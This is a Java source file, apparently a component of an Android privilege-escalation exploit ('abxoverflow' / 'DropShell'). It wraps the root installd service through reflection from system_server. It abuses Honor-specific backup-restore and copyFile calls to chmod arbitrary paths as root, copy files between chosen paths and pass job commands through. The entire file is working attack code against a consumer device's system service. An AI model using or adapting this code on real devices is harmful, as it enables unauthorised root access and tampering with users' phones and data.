package com.example.abxoverflow.droppedapk;

import android.os.IBinder;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;

/**
 * Reflected wrapper around android.os.IInstalld (runs in system_server, uid 1000).
 * installd itself is uid 0 but only exposes constrained file/data operations.
 *
 * Android 14 / Honor: copyFile(String json, IFileOperationCallbackNative) is implemented
 * in libhwexinstalld FileCollectManager — see UNPACKED_ROM libhwexinstalld.so.
 */
final class InstalldClient {
    private static final String TAG = "DropShell";
    private static final int COPY_WAIT_MS = 8000;
    private static final int JOB_WAIT_MS = 5000;

    /** Honor backup-restore staging (installd can read; app private data is blocked). */
    static final String BACKUP_BASE = "/data/data/android/shortcut_clone/abx";
    static final String BACKUP_SRC = BACKUP_BASE + "/backup_empty";
    static final String BACKUP_SEINFO = "platform:privapp:targetSdkVersion=34:complete";
    static final int BACKUP_UID = 1000;

    private final Object mInstalld;
    private final Class<?> mCallbackClass;

    InstalldClient() throws Exception {
        Class<?> sm = Class.forName("android.os.ServiceManager");
        IBinder binder = (IBinder) sm.getMethod("getService", String.class).invoke(null, "installd");
        if (binder == null) {
            throw new IllegalStateException("installd service is null");
        }
        Class<?> stub = Class.forName("android.os.IInstalld$Stub");
        mInstalld = stub.getMethod("asInterface", IBinder.class).invoke(null, binder);
        mCallbackClass = Class.forName("android.os.IFileOperationCallbackNative");
        Log.i(TAG, "InstalldClient connected: " + mInstalld);
    }

    Object installd() {
        return mInstalld;
    }

    String listMethods() {
        StringBuilder sb = new StringBuilder();
        for (Method m : mInstalld.getClass().getMethods()) {
            if (m.getDeclaringClass() == Object.class) continue;
            sb.append(m.getName()).append('(');
            Class<?>[] p = m.getParameterTypes();
            for (int i = 0; i < p.length; i++) {
                if (i > 0) sb.append(", ");
                sb.append(p[i].getSimpleName());
            }
            sb.append(")\n");
        }
        return sb.toString().trim();
    }

    String createAppData(String packageName, int userId, int flags, int appId,
                         String seInfo, int targetSdkVersion) throws Exception {
        Class<?> argsClass = Class.forName("android.os.CreateAppDataArgs");
        Object args = argsClass.newInstance();
        set(args, "uuid", null);
        set(args, "packageName", packageName);
        set(args, "userId", userId);
        set(args, "flags", flags);
        set(args, "appId", appId);
        set(args, "previousAppId", appId);
        set(args, "seInfo", seInfo);
        set(args, "targetSdkVersion", targetSdkVersion);

        Object result = invoke("createAppData", argsClass, args);
        return result == null ? "null" : result.toString();
    }

    String copyFileJson(String from, String to, String pkgName) throws Exception {
        CopyFileCallback cb = new CopyFileCallback();
        Object proxy = CopyFileCallback.asInterface(mCallbackClass, cb);
        String json = buildCopyFileJson(from, to, pkgName);
        Method m = mInstalld.getClass().getMethod("copyFile", String.class, mCallbackClass);
        m.invoke(mInstalld, json, proxy);
        Thread.sleep(COPY_WAIT_MS);
        String log = cb.log();
        return "ok copyFile\n" + (log.isEmpty() ? json : log);
    }

    String setFileXattr(String path, String keyDesc, int storageType, int fileType) throws Exception {
        invoke("setFileXattr", String.class, path, String.class, keyDesc,
                Integer.TYPE, storageType, Integer.TYPE, fileType);
        return "ok setFileXattr";
    }

    String linkFile(String uuid, String from, String to, String relativePath) throws Exception {
        invoke("linkFile", String.class, uuid, String.class, from, String.class, to,
                String.class, relativePath);
        return "ok linkFile";
    }

    String bindFile(String uuid, String path, String target) throws Exception {
        Method m = mInstalld.getClass().getMethod("BindFile", String.class, String.class, String.class);
        m.invoke(mInstalld, uuid, path, target);
        return "ok BindFile";
    }

    String fixupAppData(String uuid, int flags) throws Exception {
        Method m = mInstalld.getClass().getMethod("fixupAppData", String.class, int.class);
        m.invoke(mInstalld, uuid, flags);
        return "ok fixupAppData";
    }

    String restoreconAppData(String uuid, String packageName, int userId, int flags) throws Exception {
        Method m = mInstalld.getClass().getMethod("restoreconAppData",
                String.class, String.class, int.class, int.class);
        m.invoke(mInstalld, uuid, packageName, userId, flags);
        return "ok restoreconAppData";
    }

    String linkNativeLibraryDirectory(String uuid, String packageName, String nativeLibDir32,
                                      String nativeLibDir64, int userId) throws Exception {
        Method m = mInstalld.getClass().getMethod("linkNativeLibraryDirectory",
                String.class, String.class, String.class, String.class, int.class);
        m.invoke(mInstalld, uuid, packageName, nativeLibDir32, nativeLibDir64, userId);
        return "ok linkNativeLibraryDirectory";
    }

    String rmPackageDir(String codePath) throws Exception {
        invoke("rmPackageDir", String.class, codePath);
        return "ok rmPackageDir";
    }

    String executeJob(String jobCmd) throws Exception {
        Method m = mInstalld.getClass().getMethod("excuteJob", String.class);
        Object r = m.invoke(mInstalld, jobCmd);
        Thread.sleep(JOB_WAIT_MS);
        return "ok excuteJob result=" + r;
    }

    int startBackupSession() throws Exception {
        Class<?> cbClass = Class.forName("android.os.IBackupSessionCallback");
        BackupSessionCallback cb = new BackupSessionCallback();
        Object proxy = BackupSessionCallback.asInterface(cbClass, cb);
        Method m = mInstalld.getClass().getMethod("startBackupSession", cbClass);
        Object r = m.invoke(mInstalld, proxy);
        if (r == null) {
            throw new IllegalStateException("startBackupSession returned null");
        }
        return ((Number) r).intValue();
    }

    int executeBackupTask(int sessionId, String taskCmd) throws Exception {
        Method m = mInstalld.getClass().getMethod("executeBackupTask", int.class, String.class);
        Object r = m.invoke(mInstalld, sessionId, taskCmd);
        return r == null ? -1 : ((Number) r).intValue();
    }

    int finishBackupSession(int sessionId) throws Exception {
        Method m = mInstalld.getClass().getMethod("finishBackupSession", int.class);
        Object r = m.invoke(mInstalld, sessionId);
        return r == null ? -1 : ((Number) r).intValue();
    }

    /**
     * Root chmod via libhwexinstalld restore_application_from_infofile.
     * Info line: path;modeDecimal;type;size;mtime  (type=0 for regular file)
     */
    String chmodViaBackupRestore(String targetPath, int modeOctal) throws Exception {
        File target = new File(targetPath);
        if (!target.exists()) {
            return "missing " + targetPath;
        }

        long size = target.length();
        long mtime = target.lastModified() / 1000L;
        String infoLine = targetPath + ";" + modeOctal + ";0;" + size + ";" + mtime + "\n";

        String label = backupLabelFor(targetPath);
        String restoreDest = BACKUP_BASE + "/" + label;
        File infoFile = new File(BACKUP_SRC + "/" + label + ".txt");
        File dataDir = new File(BACKUP_SRC + "/" + label);

        if (!dataDir.mkdirs()) {
            Log.w(TAG, "mkdir may have failed: " + dataDir);
        }
        if (!infoFile.getParentFile().mkdirs()) {
            Log.w(TAG, "mkdir may have failed: " + infoFile.getParentFile());
        }
        try (FileOutputStream fos = new FileOutputStream(infoFile)) {
            fos.write(infoLine.getBytes(StandardCharsets.UTF_8));
        }

        StringBuilder log = new StringBuilder();
        log.append("infoFile=").append(infoFile.getAbsolutePath()).append('\n');
        log.append("infoLine=").append(infoLine.trim()).append('\n');
        log.append("restoreDest=").append(restoreDest).append('\n');

        int session = startBackupSession();
        log.append("session=").append(session).append('\n');
        try {
            Thread.sleep(500);
            String cmd = "restore dir " + BACKUP_SRC + " " + restoreDest + " "
                    + BACKUP_SEINFO + " " + BACKUP_UID;
            int task = executeBackupTask(session, cmd);
            log.append("task=").append(task).append(" cmd=").append(cmd).append('\n');
            Thread.sleep(3000);
            int fin = finishBackupSession(session);
            log.append("finish=").append(fin).append('\n');
        } catch (Exception e) {
            try {
                finishBackupSession(session);
            } catch (Exception ignored) {
            }
            throw e;
        }
        return log.toString().trim();
    }

    static String backupLabelFor(String targetPath) {
        String base = new File(targetPath).getName();
        if (base.isEmpty()) base = "root";
        return "perm_" + base.replaceAll("[^a-zA-Z0-9._-]", "_");
    }

    static String parentDir(String path) {
        int i = path.lastIndexOf('/');
        return i > 0 ? path.substring(0, i) : path;
    }

    static String buildCopyFileJson(String from, String to, String pkgName) {
        return "{\"rule\":[{\"srcPath\":\"" + jsonEscape(from)
                + "\",\"destPath\":\"" + jsonEscape(to)
                + "\",\"pkgName\":\"" + jsonEscape(pkgName == null ? "" : pkgName)
                + "\"}],\"needProgress\":0}";
    }

    private static String jsonEscape(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\").replace("\"", "\\\"");
    }

    private Object invoke(String name, Class<?> t1, Object a1) throws Exception {
        return invoke(name, t1, a1, null, null, null, null, null, null);
    }

    private Object invoke(String name, Class<?> t1, Object a1, Class<?> t2, Object a2,
                          Class<?> t3, Object a3, Class<?> t4, Object a4) throws Exception {
        Method m = findMethod(name, t1, t2, t3, t4);
        if (t2 == null) {
            return m.invoke(mInstalld, a1);
        }
        if (t3 == null) {
            return m.invoke(mInstalld, a1, a2);
        }
        if (t4 == null) {
            return m.invoke(mInstalld, a1, a2, a3);
        }
        return m.invoke(mInstalld, a1, a2, a3, a4);
    }

    private Method findMethod(String name, Class<?>... types) throws NoSuchMethodException {
        int n = 0;
        for (Class<?> t : types) {
            if (t != null) n++;
        }
        Class<?>[] sig = new Class<?>[n];
        int i = 0;
        for (Class<?> t : types) {
            if (t != null) sig[i++] = t;
        }
        return mInstalld.getClass().getMethod(name, sig);
    }

    private static void set(Object o, String field, Object value) throws Exception {
        o.getClass().getField(field).set(o, value);
    }

    static String describe(Throwable t) {
        if (t instanceof InvocationTargetException) {
            t = ((InvocationTargetException) t).getTargetException();
        }
        return t.getClass().getSimpleName() + ": " + t.getMessage();
    }
}
